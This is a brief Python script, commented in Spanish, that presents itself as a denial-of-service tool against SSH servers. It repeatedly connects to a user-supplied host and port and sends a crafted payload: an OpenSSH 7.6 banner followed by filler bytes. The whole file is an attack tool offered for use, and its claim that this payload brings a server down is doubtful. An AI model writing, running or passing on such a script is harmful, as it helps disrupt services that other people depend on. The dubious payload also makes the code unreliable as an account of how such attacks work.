#!/usr/bin/env python3

import argparse
import socket
import sys

# Función para enviar varios paquetes maliciosos al servidor SSH de destino
def send_payload(host, port, num_packets):
    payload = b'''SSH-2.0-OpenSSH_7.6
FFFFFFFFFFFFFFFFF
'''
    print(f'Enviando {num_packets} paquetes maliciosos a {host}:{port}...')
    try:
        for i in range(num_packets):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.sendall(payload)
            s.close()
        print('Listo.')
    except ConnectionRefusedError:
        print(f'Error: no se pudo conectar con {host}:{port}.')
        sys.exit(1)

# Configuración del parser de argumentos
arg_parser = argparse.ArgumentParser(description='Envía un paquete malicioso al servidor SSH de destino para causar una denegación de servicio.')
arg_parser.add_argument('host', type=str, help='dirección IP del servidor SSH de destino')
arg_parser.add_argument('-p', '--port', type=int, default=22, help='número de puerto del servidor SSH de destino (por defecto: 22)')
arg_parser.add_argument('-n', '--num_packets', type=int, default=1, help='número de paquetes maliciosos a enviar (por defecto: 1)')
args = arg_parser.parse_args()

# Ejecución del script
send_payload(args.host, args.port, args.num_packets)
